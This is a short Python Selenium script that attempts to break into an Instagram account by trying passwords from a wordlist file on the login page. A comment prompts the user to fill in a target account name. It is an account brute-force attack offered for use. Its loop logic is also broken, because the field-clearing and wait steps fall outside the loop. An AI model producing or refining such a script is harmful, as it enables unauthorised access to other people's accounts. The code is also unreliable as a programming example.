from selenium import webdriver
import time

#defining webdriver that we will use
browser = webdriver.Firefox()
#going to instagram login page
browser.get("https://www.instagram.com/accounts/login") 

#waiting for not get error
time.sleep(5) 

#finding username input by name
username = browser.find_element_by_name("username") 
#finding password input by name
password = browser.find_element_by_name("password") 

#finding login button by xpath
login = browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[4]')

#opening passwords wordlist
file = open("passwords.txt", "r") 

for line in file:
 username.send_keys("Instagram name") # <-- enter an instagram name
#writing passwords in txt file
 password.send_keys(line) 
#clicking login
 login.click() 

#wait for 3 sec
time.sleep(3) 

#clearing username and pass
username.clear() 
password.clear() 

#closing file, waiting for 10 sec and closing webdriver
file.close()
time.sleep(10)
browser.close()
